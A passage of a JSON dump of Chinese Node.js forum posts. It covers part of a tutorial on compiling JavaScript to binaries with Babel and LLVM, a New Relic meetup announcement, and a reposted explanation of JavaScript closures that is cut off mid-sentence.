language-js\"><code>&#x2F;&#x2F;parse.js\nconst babel_core = require(&#x27;[@babel](&#x2F;user&#x2F;babel)&#x2F;core&#x27;);\nconst fs  = require(&#x27;fs&#x27;);\nmodule.exports = function (js_path){\n    let js_conent = fs.readFileSync(js_path);\n    let js_ast = babel_core.parse(js_conent);\n    return js_ast;\n}\n</code></pre><h1>将解析的的AST绑定IR，实现编译器</h1>\n<h2>语法解析开始，针对不通的类型进入不通的入口进行解析</h2>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;jsvm.js\nclass JSVM{\n...\n    handler(node,parent_node = null) {\n        switch(node.type) {\n            case &#x27;Program&#x27;: &#x2F;&#x2F; 这是主程序入口\n                return this.programHandler(node);\n            case &#x27;FunctionDeclaration&#x27;: &#x2F;&#x2F; 当是方法的类型走这里\n                return this.functionHandler(node);\n            case &#x27;BlockStatement&#x27;: &#x2F;&#x2F; 代码块类型走这里\n                return this.blockHandler(node);\n            case &#x27;IfStatement&#x27;: &#x2F;&#x2F; IF块类型走这里\n                return this.ifHandler(node);\n            case &#x27;BinaryExpression&#x27;: &#x2F;&#x2F; 二进制表达式类型走这里\n                return this.binaryHandler(node);\n            case &#x27;ReturnStatement&#x27;: &#x2F;&#x2F; 解析返回\n                return this.returnHandler(node);\n            case &#x27;Identifier&#x27;: &#x2F;&#x2F; 变量或函数调用，需要通过父节点判断，所以传入\n                return this.identifierHandler(node,parent_node);\n            case &#x27;NumericLiteral&#x27;: &#x2F;&#x2F;数字类型走这\n                return this.numberHandler(node);\n            case &#x27;StringLiteral&#x27;: &#x2F;&#x2F;文本类型走这\n                return this.stringHandler(node);\n            case &#x27;CallExpression&#x27;: &#x2F;&#x2F; 函数调用走着\n                return this.callHandler(node);\n            case &#x27;ExpressionStatement&#x27;: &#x2F;&#x2F; 表达式类型走这\n                return this.expressionHandler(node);\n            default: &#x2F;&#x2F; 目前不支持的类型直接抛错\n                throw new Error(&#x27;not support grammar type&#x27;);\n        }\n    }\n    &#x2F;&#x2F; 入口文件\n    gen() {\n        &#x2F;&#x2F; 初始化变量和方法包括C扩展\n        this.init();\n        &#x2F;&#x2F; 将ast进行解析和绑定\n        this.handler(this.js_ast.program);\n    }\n    &#x2F;&#x2F; 对程序主题不断解析下一个语法节点就好\n    programHandler(node) {\n        for(let i=0;i&lt;node.body.length;i++)\n        {\n            this.handler(node.body[i]);\n        }\n    }\n...    \n}\n</code></pre><h2>以函数绑定举例</h2>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;jsvm.js\n    functionHandler(node) {\n        &#x2F;&#x2F; 拿到函数节点的函数名\n        let func_name = node.id.name;\n        &#x2F;&#x2F; 判断模块中函数是否存在\n        the_function = the_module.getFunction(func_name);\n        if (the_function) {\n           throw new Error(&#x27;function is exist&#x27;);\n        }\n        &#x2F;&#x2F; 设置返回值，目前先定死为double类型\n        let double_type = llvm.Type.getDoubleTy(the_context);\n        &#x2F;&#x2F; 设置参数，目前先定死为double类型\n        let params_list = [];\n        for(let i=0;i&lt;node.params.length;i++)\n        {\n            params_list.push(double_type);\n        }\n        &#x2F;&#x2F; 把参数注入，生成函数类型\n        let the_function_type = llvm.FunctionType.get(\n            double_type,params_list,false\n        );\n        &#x2F;&#x2F; 创造出一个函数\n        the_function = llvm.Function.create(\n            the_function_type,\n            llvm.LinkageTypes.ExternalLinkage,\n            func_name,the_module\n        );\n        &#x2F;&#x2F; 将参数的名称插入\n        let the_args = the_function.getArguments();\n        for(let i=0;i&lt;the_args.length;i++)\n        {\n            the_args[i].name=node.params[i].name;\n        }\n        &#x2F;&#x2F; 创建函数主运行节点\n        let basic_block = llvm.BasicBlock.create(the_context,&quot;entry&quot;,the_function);\n        &#x2F;&#x2F; 设置代码插入位置，这个basic_block就是entry节点\n        builder.setInsertionPoint(basic_block);\n        &#x2F;&#x2F; 这里是为了注册变量，使得在函数作用域内变量可用\n        variable_map = {};\n        for(let i=0;i&lt;the_args.length;i++)\n        {\n            variable_map[the_args[i].name]=the_args[i];\n        }\n        &#x2F;&#x2F; 判断函数是否是块表达式，不是则踢出\n        if (node.body.type!=&#x27;BlockStatement&#x27;)\n        {\n            throw new Error(&#x27;function body only support BlockStatement&#x27;);\n        }\n        &#x2F;&#x2F; 调用解析块表达式的方法\n        this.blockHandler(node.body);\n        &#x2F;&#x2F; 校验函数是否正确，不正确这个函数会直接报错\n        llvm.verifyFunction(the_function);\n        return the_function;\n    }\n</code></pre><h2>块表达式解析的实现</h2>\n<p>其实这异步就是遍历节点进行解析，是不是很简单</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;jsvm.js\n    blockHandler(node)\n    {\n        let expr_list = [];\n        for(let i=0;i&lt;node.body.length;i++)\n        {\n            expr_list.push(this.handler(node.body[i]));\n        }\n        return expr_list;\n    }\n</code></pre><h2>以IF的解析实现来讲代码块的跳跃</h2>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;jsvm.js\n    ifHandler(node) {\n        &#x2F;&#x2F;判断条件的类型是否是二进制表达式\n        if (node.test.type!=&#x27;BinaryExpression&#x27;) {\n            throw new Error(&#x27;if conds only support binary expression&#x27;);\n        }\n        &#x2F;&#x2F; 解析二进制表达式作为条件\n        let cond = this.binaryHandler(node.test);\n        &#x2F;&#x2F; 生成数字0\n        let zero = llvm.ConstantFP.get(the_context,0);\n        &#x2F;&#x2F; 如果cond不是bool类型的指，将它转换为bool类型的值\n        let cond_v = builder.createFCmpONE(cond,zero,&quot;ifcond&quot;);\n        &#x2F;&#x2F; 创建then和else和ifcont代码块，实际就是代码块标签\n        let then_bb = llvm.BasicBlock.create(the_context,&quot;then&quot;,the_function);\n        let else_bb = llvm.BasicBlock.create(the_context,&quot;else&quot;,the_function);\n        let phi_bb = llvm.BasicBlock.create(the_context, &quot;ifcont&quot;,the_function);\n        &#x2F;&#x2F; 创造条件判断\n        &#x2F;&#x2F; 如果cond_v是真就跳跃到then_bb代码块，否则跳跃到else_bb代码块\n        builder.createCondBr(cond_v,then_bb,else_bb);\n        &#x2F;&#x2F; 设定往then_bb代码块写入内容\n        builder.setInsertionPoint(then_bb);\n        if (!node.consequent) {throw new Error(&#x27;then not extist&#x27;);}\n        if (node.consequent.type!=&#x27;BlockStatement&#x27;)\n        {\n            throw new Error(&#x27;then body only support BlockStatement&#x27;);\n        }\n        &#x2F;&#x2F; 解析代码块\n        let then_value_list = this.blockHandler(node.consequent);\n        &#x2F;&#x2F; 如果代码块没内容就就跳跃到phi_bb代码块\n        if (then_value_list.length==0)\n        {\n            builder.createBr(phi_bb);\n        }\n        &#x2F;&#x2F; 设定往else_bb代码块写入内容，和then_else差不多\n        &#x2F;&#x2F; 不同点：else允许没有\n        builder.setInsertionPoint(else_bb);\n        let else_value_list =  [];\n        if (node.alternate) {\n            if (node.alternate.type!=&#x27;BlockStatement&#x27;)\n            {\n                throw new Error(&#x27;else body only support BlockStatement&#x27;);\n            }\n            else_value_list = this.blockHandler(node.alternate);\n        }\n        if (else_value_list.length==0)\n        {\n            builder.createBr(phi_bb);\n        }\n        &#x2F;&#x2F; 因为无论是then或else如果不中断一定会往phi_bb代码块\n        &#x2F;&#x2F; 所以后续的代码直接在phi_bb里面写就好\n        builder.setInsertionPoint(phi_bb);\n    }\n</code></pre><h1>支持C扩展的实现</h1>\n<p>首先先定义存在值</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;jsvm.js\n    &#x2F;&#x2F; 定义一个C函数printDouble用于打印二进制变量\n    getPrintDouble()\n    {\n        &#x2F;&#x2F; 获取返回值类型\n        let double_type = llvm.Type.getDoubleTy(the_context)\n        &#x2F;&#x2F; 设置参数列表\n        let params_list = [double_type];\n        &#x2F;&#x2F; 获取函数类型\n        let the_function_type = llvm.FunctionType.get(\n            double_type,params_list,false\n        );\n        &#x2F;&#x2F; 创建函数定义\n        the_function = llvm.Function.create(\n            the_function_type,\n            llvm.LinkageTypes.ExternalLinkage,\n            &#x27;printDouble&#x27;,the_module\n        );\n        &#x2F;&#x2F; 设置参数名称\n        let the_args = the_function.getArguments();\n        the_args[0].name = &quot;double_name&quot;;\n        return the_function;\n    }\n    &#x2F;&#x2F; 初始化方法值讲需要预置的方法放入\n    init()\n    {\n        init_function_map.printDouble = this.getPrintDouble();\n    }\n</code></pre><p>C代码的实现printDouble方法</p>\n<pre class=\"prettyprint language-cpp\"><code>&#x2F;&#x2F; printDouble.cpp\n#include &lt;stdio.h&gt;\n&#x2F;&#x2F; 问什么要要加extern &quot;C&quot; ,因为c++编译的时候会自动进行函数签名\n&#x2F;&#x2F; 如果没有extern &quot;C&quot; ,汇编里的方法名就会是Z11printDoubled\n&#x2F;&#x2F; 其中签名前部分由返回值和命名空间名字中间是方法名，后面是参数缩写\nextern &quot;C&quot; {\n    &#x2F;&#x2F; 设定返回值和参数都是double类型\n    double printDouble(double double_num) {\n        &#x2F;&#x2F; 打印double类型\n        printf(&quot;double_num is: %f\\r\\n&quot;,double_num);\n        &#x2F;&#x2F; 返回double类型\n        return double_num;\n    }\n}\n</code></pre><h1>看看实现效果</h1>\n<p>要被编译的代码</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; fibo.js 这是斐波纳切数\nfunction fibo(num) {\n    if (num&lt;=2) {return 1;}\n    return fibo(num-1)+fibo(num-2);\n}\n&#x2F;&#x2F; 讲main作为主函数运行\nfunction main()\n{\n    return printDouble(fibo(9));\n}\n</code></pre><p>开始编译,并生成中间代码和bitcode代码，如下</p>\n<pre class=\"prettyprint language-sh\"><code># index.js是编译器入口，fibo.js是要被编译的函数\nnode index.js fibo.js\n</code></pre><p><img src=\"//static.cnodejs.org/FkVgq9TOD06MjNOPQtUi2GyW6jG5\" alt=\"tobc.png\">\n将bitcode代码生成汇编代码</p>\n<pre class=\"prettyprint language-sh\"><code>llc fibo.js.bc -o fibo.s\n</code></pre><p>将汇编代码和我们要注入的C代码一起编译</p>\n<blockquote>\n<p>当然除了C只要能被gcc编译成汇编的也都支持作为扩展语言,本文举例C代码容易让人理解</p>\n</blockquote>\n<pre class=\"prettyprint language-sh\"><code>gcc printDouble.cpp fibo.s -o fibo\n</code></pre><p>最后运行看看</p>\n<pre class=\"prettyprint language-sh\"><code>.&#x2F;fibo\n</code></pre><p><img src=\"//static.cnodejs.org/Fm9Qwp34myfupadRGObeivt_Kcag\" alt=\"run.png\"></p>\n<h1>总结</h1>\n<p>这次实现是用纯JS就能实现，如果后续这个JSVM能编译覆盖所有的编译器自身所有的代码功能，理论上来说可以用JSVM编译JSVM实现自举，当然这个是一个浩大的工程，方法是有了缺的只是时间而已。</p>\n</div>","title":"使用JS实现JS编译器，并将目标js生成二进制","last_reply_at":"2019-02-19T05:57:30.553Z","good":true,"top":false,"reply_count":31,"visit_count":4603,"create_at":"2018-09-07T08:44:00.128Z","author":{"loginname":"zy445566","avatar_url":"https://avatars2.githubusercontent.com/u/14976489?v=4&s=120"}},{"id":"5c6b5a39b8913c5110b0bf82","author_id":"5c1af54c3898674067a76341","tab":"share","content":"<div class=\"markdown-text\"><h2>一、活动亮点</h2>\n<p>1、剖析技术，学习掌握最新 New Relic 分布式跟踪之使用方法 💪\n2、快速部署监测，真实案例分析，优化应用性能及解决后端瓶颈问题 🔥\n3、干货实操，现场进行 Coding 教学 💻</p>\n<p>欢迎对 New Relic 或部署网站监测工具感兴趣的同学参加。\n有兴趣的小伙伴记得带上个人电脑，参与 Coding 环节将有机会获得主办方准备精美奖品。</p>\n<h2>二、关于 New Relic</h2>\n<p>New Relic 是一个国际 SaaS 应用数据分析平台。为企业提供全栈数据收集、监测、分析服务，以保障用户软件稳定高效地运行。以便您可以轻松地查看和分析性能问题，并实时获得深入性能见解。</p>\n<h2>三、活动详情</h2>\n<h3>（1）活动时间：</h3>\n<p>2月23日 14:00-17:00</p>\n<h3>（2）活动地点：</h3>\n<p>深圳市南山区中国地质大学产学研基地 2 楼 A208 科技寺</p>\n<h3>（3）活动流程：</h3>\n<p>14:00-14:15 签到\n14:15-14:30 主持人开场\n14:30-14:45 New Relic 介绍及分享分布式跟踪\n14:45-15:00 AfterShip 真实案例分析\n15:00-16:30 干货实操，现场进行 Coding 教学\n16:30-17:00 茶点及自由交流时间</p>\n<h3>（4）主讲嘉宾</h3>\n<p><strong>Steve Ng 技术顾问, New Relic (亚太区)</strong></p>\n<p>Steve 是 New Relic 的技术咨询团队的核心成员，专注于亚太地区。他在亚太区拥有超过10年的技术咨询经验，与许多跨国客户合作，涉及多个组织，如 VMware、Toptal 和 New Relic。</p>\n<p><strong>彭子和 高级 SRE, AfterShip</strong></p>\n<p>多年丰富的运维经验，熟悉电商、B2C、SaaS等业务场景的运维及技术管理工作。致力于海量业务的技术运营保障工作，对架构规划、分布式运维、性能监控调优、线上解决问题、用户体验提升等运维增值服务有丰富的见解。</p>\n<h3>(5)主办方</h3>\n<p>AfterShip 是一家以产品为驱动，技术为核心的快递查询行业的全球龙头公司，日均承担过亿 API 请求。客户有 Amazon, Wish, eBay, Paypal, Groupon, Etsy, 及各大小电商超过 100,000 家。AfterShip 2012 年成立于香港，2018 年在深圳设立研发中心，专注 To B 端 SaaS 平台企业服务，与全球 500 多家物流公司达成合作，涉及 30 多种主流语言业务体系。帮助跨境电商及平台，将全球快递信息查询自动化，优化发货流程，提高退货效率，减低营运成本，提高买家复购率。</p>\n<h2>四、报名渠道</h2>\n<p>活动咨询请添加微信号：aftership2018，备注“公司+职位+姓名”，主办方审核通过将会邀请加入活动群。</p>\n<p>或者戳活动行链接报名： <a href=\"http://www.huodongxing.com/event/5480298089400?td=9763297835911\">http://www.huodongxing.com/event/5480298089400?td=9763297835911</a></p>\n</div>","title":"[2 月 23 日-深圳南山-技术干货推荐]最新 New Relic 分布式跟踪","last_reply_at":"2019-02-19T01:22:01.684Z","good":false,"top":false,"reply_count":0,"visit_count":707,"create_at":"2019-02-19T01:22:01.684Z","author":{"loginname":"littleflowersansan","avatar_url":"https://avatars3.githubusercontent.com/u/42596541?v=4&s=120"}},{"id":"5c62403805cc322e7b137f8b","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FmrUNUrOP4SEOWrAMXQScFmOYqfR\" alt=\"js_closure.png\">\n<strong>摘要：</strong> 理解JS闭包。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017136436\">我从来不理解JavaScript闭包，直到有人这样向我解释它…</a></li>\n<li>作者：<a href=\"https://segmentfault.com/a/1190000017794020\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>正如标题所述，JavaScript闭包对我来说一直有点神秘,看过很多闭包的文章，在工作使用过闭包，有时甚至在项目中使用闭包，但我确实是这是在使用闭包的知识。</p>\n<p>最近看国外的一些文章，终于，有人用于一种让我明白方式对闭包进行了解释，我将在本文中尝试使用这种方法来解释闭包。</p>\n<h3>准备</h3>\n<p>在理解闭包之前，有个重要的概念需要先了解一下，就是 js 执行上下文。</p>\n<p>这篇<a href=\"http://davidshariff.com/blog/what-is-the-execution-context-in-javascript/\">文章</a>是执行上下文 很不错的入门教程，文章中提到：</p>\n<blockquote>\n<p>当代码在JavaScript中运行时，执行代码的环境非常重要，并将概括为以下几点：</p>\n<p><strong>全局代码</strong>——第一次执行代码的默认环境。</p>\n<p><strong>函数代码</strong>——当执行流进入函数体时。</p>\n<p>(…) —— 我们当作 执行上下文 是当前代码执行的一个环境与范围。</p>\n</blockquote>\n<p>换句话说，当我们启动程序时，我们从全局执行上下文中开始。一些变量是在全局执行上下文中声明的。我们称之为全局变量。当程序调用一个函数时，会发生什么?</p>\n<p>以下几个步骤：</p>\n<ul>\n<li>JavaScript创建一个新的执行上下文，我们叫作本地执行上下文。</li>\n<li>这个本地执行上下文将有它自己的一组变量，这些变量将是这个执行上下文的本地变量。</li>\n<li>新的执行上下文被推到到执行堆栈中。可以将执行堆栈看作是一种保存程序在其执行中的位置的容器。</li>\n</ul>\n<p>函数什么时候结束?当它遇到一个return语句或一个结束括号}。</p>\n<p>当一个函数结束时，会发生以下情况:</p>\n<ul>\n<li>这个本地执行上下文从执行堆栈中弹出。</li>\n<li>函数将返回值返回调用上下文。调用上下文是调用这个本地的执行上下文，它可以是全局执行上下文，也可以是另外一个本地的执行上下文。这取决于调用执行上下文来处理此时的返回值，返回的值可以是一个对象、一个数组、一个函数、一个布尔值等等，如果函数没有return语句，则返回undefined。</li>\n<li>这个本地执行上下文被销毁，销毁是很重要，这个本地执行上下文中声明的所有变量都将被删除，不在有变量，这个就是为什么 称为本地执行上下文中自有的变量。</li>\n</ul>\n<h4>基础的例子</h4>\n<p>在讨论闭包之前，让我们看一下下面的代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>1: let a = 3\n2: function addTwo(x) {\n3:   let ret = x + 2\n4:   return ret\n5: }\n6: let b = addTwo(a)\n7: console.log(b)\n</code></pre><p>为了理解JavaScript引擎是如何工作的，让我们详细分析一下：</p>\n<ul>\n<li>在第1行，我们在全局执行上下文中声明了一个新变量a，并将赋值为3。</li>\n<li>接下来就变得棘手了，第2行到第5行实际上是在一起的。这里发生了什么? 我们在全局执行上下文中声明了一个名为<code>addTwo</code>的新变量,我们给它分配了什么?一个函数定义。两个括号{}之间的任何内容都被分配给<code>addTwo</code>，函数内部的代码没有被求值，没有被执行，只是存储在一个变量中以备将来使用。</li>\n<li>现在我们在第6行。它看起来很简单，但是这里有很多东西需要拆开分析。首先，我们在全局执行上下文中声明一个新变量，并将其标记为<code>b</code>，变量一经声明，其值即为undefined。</li>\n<li>接下来，仍然在第6行，我们看到一个赋值操作符。我们准备给变量<code>b</code>赋一个新值，接下来我们看到一个函数被调用。当您看到一个变量后面跟着一个圆括号(…)时，这就是调用函数的信号，接着，每个函数都返回一些东西(值、对象或 undefined)，无论从函数返回什么，都将赋值给变量<code>b</code>。</li>\n<li>但是首先我们需要调用标记为<code>addTwo</code>的函数。JavaScript将在其全局执行上下文内存中查找名为<code>addTwo</code>的变量。噢，它找到了一个，它是在步骤2(或第2 - 5行)中定义的。变量<code>add2</code>包含一个函数定义。注意，变量<code>a</code>作为参数传递给函数。JavaScript在全局执行上下文内存中搜索变量<code>a</code>，找到它，发现它的值是3，并将数字3作为参数传递给函数，准备好执行函数。</li>\n<li>现在执行上下文将切换,创建了一个新的本地执行上下文，我们将其命名为“addTwo执行上下文”，执行上下文被推送到调用堆栈上。在addTwo执行上下文中，我们要做的第一件事是什么?</li>\n<li>你可能会说，“在addTwo执行上下文中声明了一个新的变量ret”，这是不对的。正确的答案是，我们需要先看函数的参数。在addTwo执行上下文中声明一个新的变量`x``，因为值3是作为参数传递的，所以变量x被赋值为3。</li>\n<li>下一步是:在addTwo执行上下文中声明一个新的变量<code>ret</code>。它的值被设置为 undefined(第三行)。</li>\n<li>仍然是第3行，需要执行一个相加操作。首先我们需要<code>x</code>的值，JavaScript会寻找一个变量<code>x</code>，它会首先在<code>addTwo</code>执行上下文中寻找，找到了一个值为3。第二个操作数是数字2。两个相加结果为5就被分配给变量<code>ret</code>。</li>\n<li>第4行，我们返回变量<code>ret</code>的内容，在addTwo执行上下文中查找，找到值为5，返回，函数结束。</li>\n<li>第4 - 5行，函数结束。addTwo执行上下文被销毁，变量<code>x</code>和<code>ret</code>被消去了，它们已经不存在了。addTwo执行上下文从调用堆栈中弹出，返回值返回给调用上下文，在这种情况下，调用上下文是全局执行上下文，因为函数<code>addTw</code>o是从全局执行上下文调用的。</li>\n<li>现在我们继续第4步的内容，返回值5被分配给变量<code>b</code>，程序仍然在第6行。</li>\n<li>在第7行，<code>b</code>的值 5 被打印到控制台了。</li>\n</ul>\n<p>对于一个非常简单的程序，这是一个非常冗长的解释，我们甚至还没有涉及闭包。但肯定会涉及的，不过首先我们得绕一两个弯。</p>\n<h3>词法作用域（Lexical scope）</h3>\n<p>我们需要理解词法作用域的一些知识。请看下面的例子：</p>\n<pre class=\"prettyprint language-javascript\"><code>1: let val1 = 2\n2: function multiplyThis(n) {\n3:   let ret = n * val1\n4:   return ret\n5: }\n6: let multiplied = multiplyThis(6)\n7: console.log(&#x27;example of scope:&#x27;, multiplied)\n</code></pre><p>这里想说明，我们在函数执行上下文中有变量，在全局执行上下文中有变量。JavaScript的一个复杂之处在于它如何查找变量，如果在函数执行上下文中找不到变量，它将在调用上下文中寻找它，如果在它的调用上下文中没有找到，就一直往上一级，直到它在全局执行上下文中查找为止。(如果最后找不到，它就是 undefined)。</p>\n<p>下面列出向个步骤来解释一下（如果你已经熟悉了，请跳过）：</p>\n<ul>\n<li>在全局执行上下文中声明一个新的变量<code>val1</code>，并将其赋值为2。</li>\n<li>行2 - 5，声明一个新的变量 <code>multiplyThis</code>，并给它分配一个函数定义。</li>\n<li>第六行，声明一个在全局执行上下文 <code>multiplied</code> 新变量。</li>\n<li>从全局执行上下文内存中查找变量<code>multiplyThis</code>，并将其作为函数执行，传递数字 6 作为参数。</li>\n<li>新函数调用(创建新执行上下文），创建一个新的 <code>multiplyThis</code> 函数执行上下文。</li>\n<li>在 <code>multiplyThis</code> 执行上下文中，声明一个变量n并将其赋值为6</li>\n<li>第 3 行。在<code>multiplyThis</code>执行上下文中，声明一个变量<code>ret</code>。</li>\n<li>继续第 3 行。对两个操作数 n 和 val1 进行乘法运算.在<code>multiplyThis</code>执行上下文中查找变量 <code>n</code>。我们在步骤6中声明了它,它的内容是数字6。在<code>multiplyThis</code>执行上下文中查找变量<code>val1</code>。<code>multiplyThis</code>执行上下文没有一个标记为 val1 的变量。我们向调用上下文查找，调用上下文是全局执行上下文，在全局执行上下文中寻找 <code>val1</code>。哦，是的、在那儿，它在步骤1中定义，数值是2。</li>\n<li>继续第 3 行。将两个操作数相乘并将其赋值给<code>ret</code>变量，6 * 2 = 12，ret现在值为 12。</li>\n<li>返回<code>ret</code>变量，销毁<code>multiplyThis</code>执行上下文及其变量 <code>ret</code> 和 <code>n</code> 。变量 <code>val1</code> 没有被销毁，因为它是全局执行上下文的一部分。</li>\n<li>回到第6行。在调用上下文中，数字 12 赋值给 <code>multiplied</code> 的变量。</li>\n<li>最后在第7行，我们在控制台中打印 <code>multiplied</code> 变量的值</li>\n</ul>\n<p>在这个例子中，我们需要记住一个函数可以访问在它的调用上下文中定义的变量，这个就是<strong>词法作用域（Lexical scope）</strong>。</p>\n<h3>返回函数的函数</h3>\n<p>在第一个例子中，函数<code>addTwo</code>返回一个数字。请记住，函数可以返回任何东西。让我们看一个返回函数的函数示例，因为这对于理解闭包非常重要。看粟子：</p>\n<pre class=\"prettyprint language-javascript\"><code> 1: let val = 7\n 2: function createAdder() {\n 3:   function addNumbers(a, b) {\n 4:     let ret = a + b\n 5:     return ret\n 6:   }\n 7:   return addNumbers\n 8: }\n 9: let adder = createAdder()\n10: let sum = adder(val, 8)\n11: console.log(&#x27;example of function returning a function: &#x27;, sum)\n</code></pre><p>让我们回到分步分解：</p>\n<ul>\n<li>第一行。我们在全局执行上下文中声明一个变量<code>val</code>并赋值为 7。</li>\n<li>行2 - 8。我们在全局执行上下文中声明了一个名为 <code>createAdder</code> 的变量，并为其分配了一个函数定义。第3至7行描述了上述函数定义，和以前一样，在这一点上，我们没有直接讨论这个函数。我们只是将函数定义存储到那个变量(<code>createAdder</code>)中。</li>\n<li>第9行。我们在全局执行上下文中声明了一个名为 <code>adder</code> 的新变量，暂时，值为 undefined。</li>\n<li>第9行。我们看到括号()，我们需要执行或调用一个函数，查找全局执行上下文的内存并查找名为<code>createAdder</code> 的变量，它是在步骤2中创建的。好吧，我们调用它。</li>\n<li>调用函数时，执行到第2行。创建一个新的<code>createAdder</code>执行上下文。我们可以在<code>createAdder</code>的执行上下文中创建自有变量。js 引擎将<code>createAdder</code>的上下文添加到调用堆栈。这个函数没有参数，让我们直接跳到它的主体部分.</li>\n<li>第 3 - 6 行。我们有一个新的函数声明，我们在<code>createAdder</code>执行上下文中创建一个变量addNumbers。这很重要，<code>addnumber</code>只存在于<code>createAdder</code>执行上下文中。我们将函数定义存储在名为 `addNumbers`` 的自有变量中。</li>\n<li>在第7行，我们返回变量<code>addNumbers</code>的内容。js引擎查找一个名为<code>addNumbers</code>的变量并找到它，这是一个函数定义。好的，函数可以返回任何东西，包括函数定义。我们返<code>addNumbers</code>的定义。第4行和第5行括号之间的内容构成该函数定义。</li>\n<li>返回时，<code>createAdder</code>执行上下文将被销毁。<code>addNumbers</code> 变量不再存在。但<code>addNumbers</code>函数定义仍然存在，因为它返回并赋值给了adder 变量。</li>\n<li>第10行。我们在全局执行上下文中定义了一个新的变量 <code>sum</code>，先负值为 undefined;</li>\n<li>接下来我们需要执行一个函数。哪个函数?是名为<code>adder</code>变量中定义的函数。我们在全局执行上下文中查找它，果然找到了它，这个函数有两个参数。</li>\n<li>让我们查找这两个参数，第一个是我们在步骤1中定义的变量<code>val</code>，它表示数字7，第二个是数字8。</li>\n<li>现在我们要执行这个函数，函数定义概述在第3-5行，因为这个函数是匿名，为了方便理解，我们暂且叫它<code>adder</code>吧。这时创建一个<code>adder</code>函数执行上下文，在<code>adder</code>执行上下文中创建了两个新变量 <code>a</code> 和 <code>b</code>。它们分别被赋值为 7 和 8，因为这些是我们在上一步传递给函数的参数。</li>\n<li>第 4 行。在<code>adder</code>执行上下文中声明了一个名为<code>ret</code>的新变量,</li>\n<li>第 4 行。将变量<code>a</code>的内容和变量<code>b</code>的内容相加得15并赋给ret变量。</li>\n<li><code>ret</code>变量从该函数返回。这个匿名函数执行上下文被销毁，从调用堆栈中删除，变量<code>a</code>、<code>b</code>和<code>ret</code>不再存在。</li>\n<li>返回值被分配给我们在步骤9中定义的<code>sum</code>变量。</li>\n<li>我们将<code>sum</code>的值打印到控制台。</li>\n<li>如预期，控制台将打印15。我们在这里确实经历了很多困难，我想在这里说明几点。首先，函数定义可以存储在变量中，函数定义在程序调用之前是不可见的。其次，每次调用函数时，都会(临时)创建一个本地执行上下文。当函数完成时，执行上下文将消失。函数在遇到return或右括号}时执行完成。</li>\n</ul>\n<p><strong>码部署后可能存在的BUG没法实时知道，事后为了解决这些BUG，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具 <a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<h3>最后,一个闭包</h3>\n<p>看看下面的代码，并试着弄清楚会发生什么。</p>\n<pre class=\"prettyprint language-javascript\"><code> 1: function createCounter() {\n 2:   let counter = 0\n 3:   const myFunction = function() {\n 4:     counter = counter + 1\n 5:     return counter\n 6:   }\n 7:   return myFunction\n 8: }\n 9: const increment = createCounter()\n10: const c1 = increment()\n11: const c2 = increment()\n12: const c3 = increment()\n13: console.log(&#x27;example increment&#x27;, c1, c2, c3)\n</code></pre><p>现在，我们已经从前两个示例中掌握了它的诀窍，让我们按照预期的方式快速执行它：</p>\n<ul>\n<li>行1 - 8。我们在全局执行上下文中创建了一个新的变量<code>createCounter</code>，并赋值了一个的函数定义。</li>\n<li>第9行。我们在全局执行上下文中声明了一个名为<code>increment</code>的新变量。</li>\n<li>第9行。我们需要调用<code>createCounter</code>函数并将其返回值赋给<code>increment</code>变量。</li>\n<li>行1 - 8。调用函数，创建新的本地执行上下文。</li>\n<li>第2行。在本地执行上下文中，声明一个名为<code>counter</code>的新变量并赋值为 0;</li>\n<li>行3 - 6。声明一个名为<code>myFunction</code>的新变量，变量在本地执行上下文中声明,变量的内容是为第4行和第5行所定义。</li>\n<li>第7行。返回<code>myFunction</code>变量的内容，删除本地执行上下文。变量<code>myFunction</code>和<code>counter</code>不再存在。此时控制权回到了调用上下文。</li>\n<li>第9行。在调用上下文(全局执行上下文)中，<code>createCounter</code>返回的值赋给了<code>increment</code>，变量<code>increment</code>现在包含一个函数定义内容为<code>createCounter</code>返回的函数。它不再标记为<code>myFunction``，但它的定义是相同的。在全局上下文中，它是的标记为</code>labeledincrement`。</li>\n<li>第10行。声明一个新变量(c1)。</li>\n<li>继续第10行。查找<code>increment</code>变量，它是一个函数并调用它。它包含前面返回的函数定义，如第4-5行所定义的。</li>\n<li>创建一个新的执行上下文。没有参数。开始执行函数。</li>\n<li>第4行。counter=counter + 1。在本地执行上下文中查找<code>counter</code>变量。我们只是创建了那个上下文，从来没有声明任何局部变量。让我们看看全局执行上下文。这里也没有<code>counter</code>变量。Javascript会将其计算为counter = undefined + 1，声明一个标记为<code>counter</code>的新局部变量，并将其赋值为number 1，因为undefined被当作值为 0。</li>\n<li>第5行。我们变量<code>counter</code>的值(1)，我们销毁本地执行上下文和<code>counter</code>变量。</li>\n<li>回到第10行。返回值(1)被赋给c1。</li>\n<li>第11行。重复步骤10-14，c2也被赋值为1。</li>\n<li>第12行。重复步骤10-14，c3也被赋值为1。</li>\n<li>第13行。我们打印变量c1 c2和c3的内容。</li>\n</ul>\n<p>你自己试试，看看会发生什么。你会将注意到，它并不像从我上面的解释中所期望的那样记录1,1,1。而是记录1,2,3。这个是为什么?</p>\n<p>不知怎么滴，<code>increment</code>函数记住了那个<code>cunter</code>的值。这是怎么回事?</p>\n<p><code>counter</code>是全局执行上下文的一部分吗?尝试 